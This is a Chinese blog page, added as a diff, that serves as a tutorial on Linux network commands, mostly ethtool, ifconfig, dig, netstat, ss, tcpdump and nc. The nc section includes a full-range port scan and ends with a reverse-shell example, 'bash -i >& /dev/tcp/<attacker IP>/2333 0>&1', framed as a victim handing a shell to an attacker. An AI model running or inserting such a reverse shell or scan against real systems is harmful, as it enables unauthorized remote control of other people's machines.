@@ -1,0 +1,924 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Linux 网络命令,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="网络配置ethtoolethtool 是用于查询及设置网卡参数的命令 12345678910111213141516171819202122232425[root@server ~]# ethtool em3Settings for em3: Supported ports: [ TP ] Supported link modes: 10baseT/Half 10baseT/Full">
+<meta name="keywords" content="Linux 网络命令">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux网络命令">
+<meta property="og:url" content="http://yoursite.com/2019/12/28/Linux/Linux网络命令/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="网络配置ethtoolethtool 是用于查询及设置网卡参数的命令 12345678910111213141516171819202122232425[root@server ~]# ethtool em3Settings for em3: Supported ports: [ TP ] Supported link modes: 10baseT/Half 10baseT/Full">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-12-30T07:10:00.956Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux网络命令">
+<meta name="twitter:description" content="网络配置ethtoolethtool 是用于查询及设置网卡参数的命令 12345678910111213141516171819202122232425[root@server ~]# ethtool em3Settings for em3: Supported ports: [ TP ] Supported link modes: 10baseT/Half 10baseT/Full">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/12/28/Linux/Linux网络命令/">
+
+
+
+
+
+  <title>Linux网络命令 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/bloodsucker1" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>
+            
+            日程表
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/28/Linux/Linux网络命令/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Linux网络命令</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-28T08:37:37+08:00">
+                2019-12-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux命令/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux命令</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><h2 id="ethtool"><a href="#ethtool" class="headerlink" title="ethtool"></a>ethtool</h2><p>ethtool 是用于查询及设置网卡参数的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]# ethtool em3</span><br><span class="line">Settings for em3:</span><br><span class="line"> Supported ports: [ TP ]</span><br><span class="line"> Supported link modes: 10baseT/Half 10baseT/Full</span><br><span class="line">                         100baseT/Half 100baseT/Full</span><br><span class="line">                         1000baseT/Full</span><br><span class="line"> Supported pause frame use: Symmetric</span><br><span class="line"> Supports auto-negotiation: Yes</span><br><span class="line"> Advertised link modes: 10baseT/Half 10baseT/Full</span><br><span class="line">                         100baseT/Half 100baseT/Full</span><br><span class="line">                         1000baseT/Full</span><br><span class="line"> Advertised pause frame use: Symmetric</span><br><span class="line"> Advertised auto-negotiation: Yes #自动协商关闭</span><br><span class="line"> Speed: 1000Mb/s</span><br><span class="line"> Duplex: Full #全双工</span><br><span class="line"> Port: Twisted Pair</span><br><span class="line"> PHYAD: 1</span><br><span class="line"> Transceiver: internal</span><br><span class="line"> Auto-negotiation: on</span><br><span class="line"> MDI-X: on (auto)</span><br><span class="line"> Supports Wake-on: d</span><br><span class="line"> Wake-on: d</span><br><span class="line"> Current message level: 0x00000007 (7)</span><br><span class="line">          drv probe link</span><br><span class="line"> Link detected: yes  # linux的网卡是否已经连接网线</span><br></pre></td></tr></table></figure>
+
+<h2 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">bond0 Link encap:Ethernet HWaddr 40:A8:F0:23:55:FC</span><br><span class="line">          inet addr:10.88.145.147 Bcast:10.88.147.255 Mask:255.255.252.0</span><br><span class="line">          UP BROADCAST RUNNING MASTER MULTICAST MTU:1500 Metric:1</span><br><span class="line">          RX packets:447831519898 errors:0 dropped:94610 overruns:0 frame:0</span><br><span class="line">          TX packets:384908972374 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0</span><br><span class="line">          RX bytes:490100615940053 (445.7 TiB) TX bytes:396116630222981 (360.2 TiB)</span><br><span class="line">第一行：连接类型：Ethernet（以太网）HWaddr（硬件mac地址）</span><br><span class="line">第二行：网卡的IP地址、子网、掩码</span><br><span class="line">第三行：UP（代表网卡开启状态）RUNNING（代表网卡的网线被接上）MULTICAST（支持组播）MTU:1500（最大传输单元）：1500字节</span><br><span class="line">第四、五行：接收、发送数据包情况统计</span><br><span class="line">第七行：接收、发送数据字节数统计信息。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">卸载网卡</span><br><span class="line">sudo ifconfig vmnet1 down</span><br><span class="line">启动网卡</span><br><span class="line">sudo ifconfig vmnet1 up</span><br></pre></td></tr></table></figure>
+
+<h2 id="ifconfig-ifup-ifdown"><a href="#ifconfig-ifup-ifdown" class="headerlink" title="ifconfig ifup ifdown"></a>ifconfig ifup ifdown</h2><p><a href="https://huangkaibo.cn/2018/04/21/ifconfig-ifup-ifdown/" target="_blank" rel="noopener">https://huangkaibo.cn/2018/04/21/ifconfig-ifup-ifdown/</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifup eth0</span><br><span class="line">ifdown eth0</span><br></pre></td></tr></table></figure>
+
+<h2 id="dhclinet"><a href="#dhclinet" class="headerlink" title="dhclinet"></a>dhclinet</h2><p>dhclient命令使用动态主机配置协议动态的配置网络接口的网络参数</p>
+<h1 id="域名路由"><a href="#域名路由" class="headerlink" title="域名路由"></a>域名路由</h1><h2 id="route"><a href="#route" class="headerlink" title="route"></a>route</h2><p>route -n # 查看路由表</p>
+<h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><p>netstat -nr<br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface<br>10.86.40.0      0.0.0.0         255.255.252.0   U         0 0          0 eth0<br>169.254.0.0     0.0.0.0         255.255.0.0     U         0 0          0 eth0<br>0.0.0.0         10.86.40.1      0.0.0.0         UG        0 0          0 eth0</p>
+<h2 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h2><blockquote>
+<p>dig（域信息搜索器）命令是一个用于询问 DNS 域名服务器的灵活的工具</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tldr dig</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">DNS Lookup utility.</span><br><span class="line"></span><br><span class="line">- Lookup the IP(s) associated with a hostname (A records):</span><br><span class="line">    dig +short hostname.com</span><br><span class="line"></span><br><span class="line">- Lookup the mail server(s) associated with a given domain name (MX record):</span><br><span class="line">    dig +short hostname.com MX</span><br><span class="line"></span><br><span class="line">- Get all types of records for a given domain name:</span><br><span class="line">    dig hostname.com ANY</span><br><span class="line"></span><br><span class="line">- Specify an alternate DNS server to query:</span><br><span class="line">    dig @8.8.8.8 hostname.com</span><br><span class="line"></span><br><span class="line">- Perform a reverse DNS lookup on an IP address (PTR record):</span><br><span class="line">    dig -x 8.8.8.8</span><br><span class="line"></span><br><span class="line">- Find authoritative name servers for the zone and display SOA records:</span><br><span class="line">    dig +nssearch hostname.com</span><br><span class="line"></span><br><span class="line">- Perform iterative queries and display the entire trace path to resolve a domain name:</span><br><span class="line">    dig +trace hostname.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="控制输出"><a href="#控制输出" class="headerlink" title="控制输出"></a>控制输出</h3><p>输出内容太多,只显示结果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig +nssearch baidu.com any |awk <span class="string">'&#123;print($11)&#125;'</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig +noall +answer dubai.com any|awk <span class="string">'&#123;print($5)&#125;'</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="网络连接"><a href="#网络连接" class="headerlink" title="网络连接"></a>网络连接</h1><h2 id="ss"><a href="#ss" class="headerlink" title="ss"></a>ss</h2><h3 id="查看开放端口"><a href="#查看开放端口" class="headerlink" title="查看开放端口"></a>查看开放端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]# ss -lt</span><br><span class="line">State      Recv-Q Send-Q                                             Local Address:Port                                                 Peer Address:Port</span><br><span class="line">LISTEN     0      128                                                            *:1001                                                            *:*</span><br><span class="line">LISTEN     0      50                                                             *:mysql                                                           *:*</span><br></pre></td></tr></table></figure>
+
+<p>ss<br>ss的含义 Socket State<br>查看链接<br><a href="https://blog.csdn.net/arkblue/article/details/7876210" target="_blank" rel="noopener">https://blog.csdn.net/arkblue/article/details/7876210</a></p>
+<h2 id="netstat-1"><a href="#netstat-1" class="headerlink" title="netstat"></a>netstat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -ni</span><br><span class="line">i 提供网络接口的信息，</span><br><span class="line">n 输出数值地址，而不是试图把他们反向解析成名字</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">netstat -na|less</span><br><span class="line">Proto Recv-Q Send-Q Local Address</span><br><span class="line">tcp4 9 0 127.0.0.1.16000 127.0.0.1.49895 ESTABLISHED</span><br><span class="line">tcp4 3762 0 127.0.0.1.16000 127.0.0.1.49899 ESTABLISHED</span><br><span class="line">tcp4 215 0 127.0.0.1.16000 127.0.0.1.49894 ESTABLISHED</span><br><span class="line">tcp4 127 0 127.0.0.1.16000 127.0.0.1.49891 ESTABLISHED</span><br><span class="line">tcp4 334 0 127.0.0.1.16000 127.0.0.1.49907 ESTABLISHED</span><br></pre></td></tr></table></figure>
+
+<p>查看机器开放哪些端口:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tunlp</span><br></pre></td></tr></table></figure>
+
+<p>查看进程对应开放端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tunlp|grep pid</span><br></pre></td></tr></table></figure>
+
+<h2 id="lsof"><a href="#lsof" class="headerlink" title="lsof"></a>lsof</h2><p>查看端口使用情况<br><code>lsof -i tcp:port</code><br>查看进程详细信息<br><code>lsof -p pid</code></p>
+<h1 id="流量统计"><a href="#流量统计" class="headerlink" title="流量统计"></a>流量统计</h1><h2 id="iftop"><a href="#iftop" class="headerlink" title="iftop"></a>iftop</h2><h2 id="nsload"><a href="#nsload" class="headerlink" title="nsload"></a>nsload</h2><h1 id="网络抓包"><a href="#网络抓包" class="headerlink" title="网络抓包"></a>网络抓包</h1><h2 id="tshark"><a href="#tshark" class="headerlink" title="tshark"></a>tshark</h2><p>tshark不仅有抓包的功能，还带了解析各种协议的能力<br><a href="https://www.centos.bz/2014/07/linux-commandline-capture-packets-tshark-wireshark/" target="_blank" rel="noopener">https://www.centos.bz/2014/07/linux-commandline-capture-packets-tshark-wireshark/</a><br><a href="http://www.qingpingshan.com/pc/fwq/353123.html" target="_blank" rel="noopener">http://www.qingpingshan.com/pc/fwq/353123.html</a></p>
+<h2 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h2><h3 id="tcpdump复杂过滤规则"><a href="#tcpdump复杂过滤规则" class="headerlink" title="tcpdump复杂过滤规则"></a>tcpdump复杂过滤规则</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -s 65535 -x -nn -q -tttt -i any -c __count__ host __host__ -w data.cap</span><br><span class="line">tcpdump -s 65535 -x -nn -q -tttt -i any -c __count__ port __port__ -w data.cap</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://www.nginx.cn/4692.html" target="_blank" rel="noopener">tcpdump抓取http的请求头和响应信息</a></p>
+<h2 id="ngrep"><a href="#ngrep" class="headerlink" title="ngrep"></a>ngrep</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ngrep -x -q -d lo &apos;&apos; &apos;port __port__&apos;</span><br><span class="line">sudo ngrep -x -q -d eth0 &apos;&apos; &apos;host __host__&apos;</span><br></pre></td></tr></table></figure>
+
+<h1 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h1><h2 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h2><h2 id="sftp命令"><a href="#sftp命令" class="headerlink" title="sftp命令"></a>sftp命令</h2><p><a href="https://linux.cn/article-8253-1.html" target="_blank" rel="noopener">https://linux.cn/article-8253-1.html</a></p>
+<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p>NetCat，在网络工具中有“瑞士军刀”美誉,一个简单、可靠的网络工具，可通过TCP或UDP协议传输读写数据,但是<code>不同版本支持参数会有差异</code>,当某些参数不能用时可以先确认下版本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# type -a nc</span><br><span class="line">nc is /usr/bin/nc</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看安装nc的rpm包</span></span><br><span class="line">root@server1 ~]# rpm -q nc</span><br><span class="line">nc-1.84-22.el6.x86_64</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看安装路径</span></span><br><span class="line">[root@server1 ~]# rpm -ql nc</span><br><span class="line">/usr/bin/nc</span><br><span class="line">/usr/share/doc/nc-1.84</span><br><span class="line">/usr/share/doc/nc-1.84/README</span><br><span class="line">/usr/share/doc/nc-1.84/scripts</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/README</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/alta</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/bsh</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/dist.sh</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/irc</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/iscan</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/ncp</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/probe</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/web</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/webproxy</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/webrelay</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/websearch</span><br><span class="line">/usr/share/man/man1/nc.1.gz</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看帮助命令</span></span><br><span class="line">[root@server1 ~]# man nc</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看centos版本信息</span></span><br><span class="line">[root@server1 ~]# cat /etc/redhat-release</span><br><span class="line">CentOS release 6.4 (Final)</span><br></pre></td></tr></table></figure>
+
+<p>下面以Centos6.4,nc1.84.22版本进行演示,<code>A机器ip:192.168.10.1  B机器ip: 192.168.10.2</code></p>
+<h3 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h3><h4 id="主机A传输数据到主机B"><a href="#主机A传输数据到主机B" class="headerlink" title="主机A传输数据到主机B"></a>主机A传输数据到主机B</h4><p>nc 使用不同的箭头符号来控制到底是接收数据还是发送数据,下面是由主机A传输数据到主机B</p>
+<h5 id="正向传输"><a href="#正向传输" class="headerlink" title="正向传输"></a>正向传输</h5><p>参数解释:</p>
+<ul>
+<li>-l: 指定监听端口</li>
+</ul>
+<p>一般正常传输,主机A开启监听,主机B nc连接获取数据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主机A: nc -l 1234 &lt; xxx.txt</span><br><span class="line">主机B: nc 192.168.10.1 1234 &gt; xxx.txt</span><br></pre></td></tr></table></figure>
+
+<h5 id="反向传输"><a href="#反向传输" class="headerlink" title="反向传输"></a>反向传输</h5><p>当存在防火墙的时候,一般防火墙设置策略是:只会限制远程机器不能直接访问本机开放的特殊端口,但是并<code>不会限制本地机器访问远程机器</code>,这样可以使用反向shell,在<code>远程主机B上开启监听,墙内机器A nc连接 远程主机B</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">墙内主机A: nc 192.168.10.2 1234 &lt; xxx.txt</span><br><span class="line">远程主机B: nc -l 1234 &gt; xxx.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="主机B传输数据到主机A"><a href="#主机B传输数据到主机A" class="headerlink" title="主机B传输数据到主机A"></a>主机B传输数据到主机A</h4><p>如果想主机B传输数据到主机A,也对应正向反向两种,这里只用正向传输举例,反向传输类似</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主机A: nc -l 1234 &gt; xxx.txt</span><br><span class="line">主机B: nc 192.168.10.1 1234 &lt; xxx.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件打包压缩后传输"><a href="#文件打包压缩后传输" class="headerlink" title="文件打包压缩后传输"></a>文件打包压缩后传输</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:tar -czvf - testdir/|nc 192.168.10.2 1234</span><br><span class="line">B:nc -l 1234   | pv -q -L 50m   | tar -xzi</span><br></pre></td></tr></table></figure>
+
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>参数解释:</p>
+<ul>
+<li>-z扫描模式</li>
+<li>-u探测udp</li>
+<li>-v 显示详细信息</li>
+<li>-n 以数字形式表示的IP地址</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz 1.1.1.1 1-65535</span><br><span class="line">nc -nvzu 1.1.1.1 1-1024</span><br></pre></td></tr></table></figure>
+
+<h3 id="远程控制-反弹shell"><a href="#远程控制-反弹shell" class="headerlink" title="远程控制(反弹shell)"></a>远程控制(反弹shell)</h3><p>受害者主机主动连接攻击者的服务端程序,将自己的bash权限交给攻击者<br>受害者：<br>Ubuntu Linux ——&gt; 192.168.146.128<br>攻击者：<br>Kali Linux ——&gt; 192.168.146.129</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击者机器: nc -lvp 2333</span><br><span class="line">被攻击者: bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">Linux 反弹shell（二）反弹shell的本质</a></p>
